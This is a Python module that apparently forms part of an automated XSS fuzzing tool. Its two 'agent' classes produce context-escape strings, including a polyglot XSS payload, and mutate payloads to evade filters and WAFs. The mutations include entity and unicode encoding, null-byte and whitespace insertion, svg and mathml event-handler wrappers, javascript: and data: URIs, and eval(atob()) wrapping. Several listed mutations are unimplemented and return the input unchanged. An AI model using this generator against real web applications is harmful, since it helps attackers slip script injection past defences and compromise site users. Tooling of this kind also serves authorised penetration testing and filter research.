import random
import urllib.parse
import base64

class EscapeAgent:
    """Level 1 RL Agent: Escape current context (7 Rules)."""
    def __init__(self):
        self.rules = [
            "angle_bracket",      # < >
            "double_quote",       # "
            "single_quote",       # '
            "backtick",           # `
            "parenthesis",        # ( )
            "curly_brace",        # { }
            "square_bracket",     # [ ]
            "polyglot_html_attr_js" # Polyglot context escape
        ]
        self.mapping = {
            "angle_bracket": "><",
            "double_quote": '"',
            "single_quote": "'",
            "backtick": "`",
            "parenthesis": "()",
            "curly_brace": "{}",
            "square_bracket": "[]",
            "polyglot_html_attr_js": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/(/*  */ alert(1) )//'>"
        }

    def act(self, action_name=None):
        """Chooses a context-breaking action."""
        if not action_name:
            action_name = random.choice(self.rules)
        return self.mapping.get(action_name, "><")

class SanitizationAgent:
    """Level 2 RL Agent: Bypass filters/sanitization (32 Mutation Rules)."""
    def __init__(self):
        self.mutations = [
            # HTML Encoding
            "html_entities", "hex_entities", "dec_entities",
            # JavaScript Obfuscation
            "js_unicode", "js_hex", "js_octal", "js_escape",
            # Case Variation
            "random_case", "mixed_case",
            # Insertion
            "null_bytes", "tab_newline", "space_insertion",
            # Encoding Chains
            "double_encode", "triple_encode",
            # WAF Bypass
            "comment_injection", "svg_wrapper", "mathml_wrap",
            "template_injection", "jsonp_wrap", "angular_expression",
            # Event Handler Variation
            "onerror_variants", "onload_variants", "onmouseover_variants",
            # Protocol Bypass
            "javascript_protocol", "data_protocol", "vbscript_protocol",
            # Advanced
            "iframe_sandbox", "object_embed", "form_action",
            "meta_refresh", "import_script", "base64_eval"
        ]

    def obfuscate(self, payload, rule=None):
        """Applies mutation techniques for filter bypass."""
        if not rule:
            rule = random.choice(self.mutations)

        if rule == "html_entities":
            return "".join(f"&#{ord(c)};" for c in payload)
        elif rule == "hex_entities":
            return "".join(f"&#x{ord(c):x};" for c in payload)
        elif rule == "dec_entities":
            return "".join(f"&#{ord(c):02};" for c in payload)
        elif rule == "js_unicode":
            return "".join(f"\\u{ord(c):04x}" for c in payload)
        elif rule == "js_hex":
            return "".join(f"\\x{ord(c):02x}" for c in payload)
        elif rule == "random_case":
            return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        elif rule == "double_encode":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif rule == "triple_encode":
            return urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(payload)))
        elif rule == "null_bytes":
            return payload.replace("<", "<%00").replace(">", ">%00")
        elif rule == "tab_newline":
            return payload.replace(" ", "%09").replace("<", "%0A<")
        elif rule == "comment_injection":
            return payload.replace(" ", "/**/")
        elif rule == "svg_wrapper":
            return f"<svg onload=\"{payload}\">"
        elif rule == "mathml_wrap":
             return f"<math><mtext><option><input onfocus=\"{payload}\" autofocus></option></mtext></math>"
        elif rule == "javascript_protocol":
            return f"javascript:{payload}"
        elif rule == "data_protocol":
            encoded = base64.b64encode(payload.encode()).decode()
            return f"data:text/html;base64,{encoded}"
        elif rule == "base64_eval":
            encoded = base64.b64encode(payload.encode()).decode()
            return f"eval(atob('{encoded}'))"
        elif rule == "onerror_variants":
            return payload.replace("alert", "onErRoR=alErT")
        elif rule == "space_insertion":
            return payload.replace(" ", "/ ")
        elif rule == "mixed_case":
             return "".join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)])
        elif rule == "js_escape":
            return f"\\{payload}"
        elif rule == "js_octal":
            return "".join(f"\\{oct(ord(c))[2:]}" for c in payload)

        # Default: some common mutations if not explicitly handled
        return payload

if __name__ == "__main__":
    ea = EscapeAgent()
    sa = SanitizationAgent()
    print(f"Escape: {ea.act('angle_bracket')}")
    print(f"Obfuscated (svg_wrapper): {sa.obfuscate('alert(1)', 'svg_wrapper')}")
    print(f"Obfuscated (random): {sa.obfuscate('alert(1)')}")
